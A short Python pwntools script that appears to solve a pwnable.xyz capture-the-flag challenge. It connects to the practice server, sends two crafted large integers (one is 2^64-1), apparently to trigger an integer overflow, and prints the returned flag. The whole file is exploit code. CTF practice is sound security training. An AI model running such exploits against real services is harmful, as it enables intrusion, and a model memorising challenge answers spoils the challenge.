from pwn import *

p = remote('svc.pwnable.xyz', 30001)

p.recvuntil('1337 input: ')
p.sendline('18446744073709551615 18446744073709546696')

print p.recvuntil('}')